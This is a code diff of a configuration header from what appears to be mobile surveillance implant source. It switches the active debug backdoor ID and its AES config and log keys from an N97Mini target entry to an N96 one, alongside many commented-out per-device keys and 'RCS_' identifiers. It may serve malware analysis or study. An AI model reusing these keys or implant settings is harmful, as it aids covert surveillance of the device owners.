@@ -20,7 +20,7 @@
 //_LIT8(KVERSION,"\x35\x5c\xde\x77");		//2011061301
 //_LIT8(KVERSION,"\x36\x5c\xde\x77");		//2011061302
 //_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
-_LIT8(KVERSION,"\x02\xd1\xde\x77");		//2011091202 7.4 bugfix1
+_LIT8(KVERSION,"\x61\x25\xdf\x77");		//2011112801 7.5
 
 // KEY Section
 
@@ -30,11 +30,11 @@ _LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
 #ifdef _DEBUG
 //_LIT8(KBACKDOORID, "RCS_0000000317\x00\x00");    //backdoor su prod/castore N97Mini
 //_LIT8(KBACKDOORID, "RCS_0000000205\x00\x00");    //backdoor su prod N81
-_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");    //backdoor su preprod/polluce N97Mini
+//_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");    //backdoor su preprod/polluce N97Mini
 //_LIT8(KBACKDOORID, "RCS_0000000012\x00\x00");    //backdoor su preprod ExternalPartner
 //_LIT8(KBACKDOORID, "RCS_0000000244\x00\x00");    //backdoor su preprod UZC Test
 //_LIT8(KBACKDOORID, "RCS_0000000076\x00\x00");    //backdoor su preprod E71
-//_LIT8(KBACKDOORID, "RCS_0000000181\x00\x00");    //backdoor su preprod/polluce N96
+_LIT8(KBACKDOORID, "RCS_0000000181\x00\x00");    //backdoor su preprod/polluce N96
 //_LIT8(KBACKDOORID, "RCS_0000000475\x00\x00");    //backdoor su prod E61
 //_LIT8(KBACKDOORID, "RCS_0000000063\x00\x00");    //backdoor su preprod E61
 //_LIT8(KBACKDOORID, "RCS_0000000018\x00\x00");    //backdoor su preprod E72
@@ -51,11 +51,11 @@ _LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
 #ifdef _DEBUG
 //_LIT8(KAES_CONFIG_KEY,"2aea9bec25ee2bfc8b4ab86d24a4d7b8"); //RCS_0000000317  //N97mini prod/castore
 //_LIT8(KAES_CONFIG_KEY,"cc2c7eff25615393e1d110194974c511"); //RCS_0000000205  //N81 prod
-_LIT8(KAES_CONFIG_KEY,"b22d3cd68cf1f376c86855823d0852a0"); //RCS_0000000005  //N97mini preprod/polluce
+//_LIT8(KAES_CONFIG_KEY,"b22d3cd68cf1f376c86855823d0852a0"); //RCS_0000000005  //N97mini preprod/polluce
 //_LIT8(KAES_CONFIG_KEY,"abce2a78b54420e9a33d70c212fe3d83"); //RCS_0000000012  //ExternalPartner preprod
 //_LIT8(KAES_CONFIG_KEY,"9d63d54b84c634e5aca2a7a6c7b26967"); //RCS_0000000244  //UZC Test polluce
 //_LIT8(KAES_CONFIG_KEY,"bffb2b51e298730bc6806de8de4869b9"); //RCS_0000000076  //E71 preprod
-//_LIT8(KAES_CONFIG_KEY,"28369b7618f651239be4739f79c708d1"); //RCS_0000000181  //N96 preprod/polluce
+_LIT8(KAES_CONFIG_KEY,"28369b7618f651239be4739f79c708d1"); //RCS_0000000181  //N96 preprod/polluce
 //_LIT8(KAES_CONFIG_KEY,"34e5e13c98d14d2317c4f52c513af286"); //RCS_0000000475  //E61 prod
 //_LIT8(KAES_CONFIG_KEY,"71d6ccbcab12055099149ce3f5d752d9"); //RCS_0000000063  //E61 preprod
 //_LIT8(KAES_CONFIG_KEY,"398cc8658b76f897825b3165fa939f6d"); //RCS_0000000018  //E72 preprod
@@ -81,11 +81,11 @@ _LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
 #ifdef _DEBUG
 //_LIT8(KAES_LOGS_KEY, "95dac559b0edfffc543b06b46c43e610");  //RCS_0000000317  //N97Mini su prod/castore
 //_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81 su prod
-_LIT8(KAES_LOGS_KEY, "a875373040a90f4a8d8dfc00ef4cc645");  //RCS_0000000005  //N97Mini su preprod/polluce
+//_LIT8(KAES_LOGS_KEY, "a875373040a90f4a8d8dfc00ef4cc645");  //RCS_0000000005  //N97Mini su preprod/polluce
 //_LIT8(KAES_LOGS_KEY, "0640685495f69a6d250951f9e707ed1b");  //RCS_0000000012  //ExternalPartner su preprod
 //_LIT8(KAES_LOGS_KEY, "909726a2c42b7ca56d86b0f16000f311");  //RCS_0000000244  //UZC Test su polluce
 //_LIT8(KAES_LOGS_KEY, "656b3dff1c1efa25e8348639e76a7973");  //RCS_0000000076  //E71 su preprod
-//_LIT8(KAES_LOGS_KEY, "916db3525f83762320b07e024eb00270");  //RCS_0000000181  //N96 su preprod/polluce
+_LIT8(KAES_LOGS_KEY, "916db3525f83762320b07e024eb00270");  //RCS_0000000181  //N96 su preprod/polluce
 //_LIT8(KAES_LOGS_KEY, "1b50df977cef743ea28f019bde34c727");  //RCS_0000000012  //E61 su prod
 //_LIT8(KAES_LOGS_KEY, "afb16f3085c03382929057fd804ee9c9");  //RCS_0000000063  //E61 su preprod
 //_LIT8(KAES_LOGS_KEY, "d4078fdf640118f158792a39cf70bab4");  //RCS_0000000135  //E72 su prod/castore
